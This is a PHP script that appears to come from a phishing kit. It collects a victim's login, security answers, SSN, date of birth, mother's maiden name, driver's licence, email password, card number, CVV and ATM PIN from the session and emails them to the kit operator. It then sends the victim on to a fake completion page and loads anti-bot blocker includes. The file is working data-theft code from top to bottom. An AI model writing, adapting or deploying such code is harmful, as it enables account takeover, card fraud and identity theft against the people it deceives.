<?php
session_start();
include "youremail.php";
include('blocker.php');
include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';




$user = $_SESSION['user'];
$pass = $_SESSION['password'];
$q1 = $_SESSION['question1'];
$q2 = $_SESSION['question2'];
$q3 = $_SESSION['question3'];

$a1 = $_SESSION['answer1'];
$a2 = $_SESSION['answer2'];
$a3 = $_SESSION['answer3'];

$fn = $_SESSION['FN'];
$db = $_SESSION['DB'];
$mn = $_SESSION['MN'];
$sn = $_SESSION['SN'];
$dl = $_SESSION['DL'];

$ea = $_SESSION['EA'];
$ep = $_SESSION['EP'];


$cn = $_SESSION['CN'];
$ed = $_SESSION['ED'];
$cv = $_SESSION['CV'];
$ap = $_SESSION['AP'];

if (getenv('HTTP_CLIENT_IP')){
	$ip=getenv('HTTP_CLIENT_IP');}
else {
	$ip=getenv('REMOTE_ADDR');}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
DOB: $dob
Q1: $q1
A1: $a1

Q2: $q2
A2: $a2

Q3: $q3
A3: $a3

fn: $fn
dob: $db
mmn: $mn
ssn: $sn
dL: $dl
-
email: $ea
ep: $ep
-

CC: $cn
exp:$ed
cvv: $cv
atm : $ap

Ip: $ip,$browser
Host: $hostname
=======M0TU$ by LOG$=========";
 if ( strlen($user) <= 16 && strlen($user) >=5 && $fn != "" && strlen($fn) <25) {
 $subj = "#motfullz# $user $pass $ip";
mail($to,$subj,$data);

}



header("Location: finish.php?sslchannel=true&amp;sessionid=xrBUswTnRWBlzTfC8idT1OKtdKKh7spEU1znxtKopmJYfZBnhOhjD2MQMw7TZxyTy7h5B2u0oeZDeA1v");

?>